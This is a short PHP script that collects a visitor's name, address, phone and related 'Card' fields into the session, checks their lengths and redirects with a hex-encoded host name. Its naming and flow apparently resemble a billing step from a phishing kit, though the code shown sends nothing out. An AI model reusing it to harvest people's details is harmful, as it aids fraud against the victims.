<?php
ini_set("output_buffering",4096);
session_start();

//GET HOST NAME
$host = bin2hex ($_SERVER['HTTP_HOST']);


/** Opens a sessions to store address form fields **/
$_SESSION['fName'] = $fName = $_POST['fName'];
$_SESSION['lName'] = $lName = $_POST['lName'];
$_SESSION['Address'] = $Address = $_POST['AddressCard'];
$_SESSION['City'] = $City = $_POST['CityCard'];
$_SESSION['Country'] = $Country = $_POST['CountryCard'];
$_SESSION['State'] = $State =  $_POST['StateCard'];
$_SESSION['ZIP'] = $ZIP = $_POST['ZIPCode'];
$_SESSION['Phone'] = $Phone = $_POST['PhoneCard'];



/** Validate form fields inputs **/
if ($fName=="")
{
$fname=1;
}
else
{
$fname=0;
}

if (strlen($fName)<1)
{
$fname=1;
}
else
{
$fname=0;
}


if ($lName=="")
{
$lname=1;
}
else
{
$lname=0;
}

if (strlen($lName)<1)
{
$lname=1;
}
else
{
$lname=0;
}


if ($Address=="")
{
$address=1;
}
else
{
$address=0;
}

if (strlen($Address)<4)
{
$address=1;
}
else
{
$address=0;
}




if ($City=="")
{
$city=1;
}
else
{
$city=0;
}

if (strlen($City)<3)
{
$city=1;
}
else
{
$city=0;
}



if ($State=="")
{
$state=1;
}
else
{
$state=0;
}

if (strlen($State)<1)
{
$state=1;
}
else
{
$state=0;
}


if ($Country=="")
{
$country=1;
}
else
{
$country=0;
}

if (strlen($Country)<3)
{
$country=1;
}
else
{
$country=0;
}


if ($ZIP=="")
{
$zip=1;
}
else
{
$zip=0;
}

if (strlen($ZIP)<4)
{
$zip=1;
}
else
{
$zip=0;
}






if ($Phone=="")
{
$phone=1;
}
else
{
$phone=0;
}

if (strlen($Phone)<7)
{
$phone=1;
}
else
{
$phone=0;
}





if ($fname==1||$lname==1||$address==1||$city==1||$state==1||$country==1||$zip==1||$phone==1)

{
$errors=1;
}
else{
$errors=0;
}



if ($errors !=0) {
header("Location: initiate.php?errors=$errors&fname=$fname&lname=$lname&address=$address&city=$city&state=$state&country=$country&zip=$zip&phone=$phone&valid=false&session=$host").md5(time());
}

else if ($errors !=1) {
header("Location: exception.php?str=flow&valid=true&Header_Location=$host").md5(time()); 

}
else {
header("Location: initiate.php?False=True&Location=$host").md5(time());
}

?>